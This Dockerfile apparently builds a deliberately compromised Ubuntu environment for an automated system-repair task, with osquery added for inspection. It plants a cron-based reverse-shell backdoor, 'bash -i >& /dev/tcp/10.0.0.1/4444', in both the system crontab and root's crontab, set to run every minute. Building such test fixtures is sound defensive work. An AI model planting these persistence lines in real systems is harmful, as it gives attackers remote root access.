FROM ubuntu:25.10
# Targets Ubuntu 25.10

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    cron \
    && rm -rf /var/lib/apt/lists/*

# Vulnerability: Add a crontab entry with a reverse shell backdoor.
# This runs every minute, attempting to connect back to an attacker's machine.
RUN echo '* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /etc/crontab

# Also plant a user-level crontab backdoor for root
RUN mkdir -p /var/spool/cron/crontabs && \
    echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /var/spool/cron/crontabs/root && \
    chmod 600 /var/spool/cron/crontabs/root && \
    chown root:crontab /var/spool/cron/crontabs/root

# Add a legitimate cron job for comparison
RUN echo '0 2 * * * root /usr/bin/apt-get update -q' >> /etc/crontab

# Create a test user
RUN useradd -m -s /bin/bash testuser



# === auto-sysrepair osquery layer (injected for end-to-end NS planner runs) ===
# Adds osquery-style introspection support so the solver's domain-aware
# state probe can grok user/group/package state. Idempotent in builds.
RUN apt-get update -qq && \
    apt-get install -y -qq --no-install-recommends curl gnupg ca-certificates && \
    install -d -m 0755 /etc/apt/keyrings && \
    curl -fsSL https://pkg.osquery.io/deb/pubkey.gpg | gpg --dearmor -o /etc/apt/keyrings/osquery.gpg && \
    echo 'deb [arch=amd64 signed-by=/etc/apt/keyrings/osquery.gpg] https://pkg.osquery.io/deb deb main' > /etc/apt/sources.list.d/osquery.list && \
    apt-get update -qq && \
    apt-get install -y -qq osquery && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

CMD ["sleep", "infinity"]
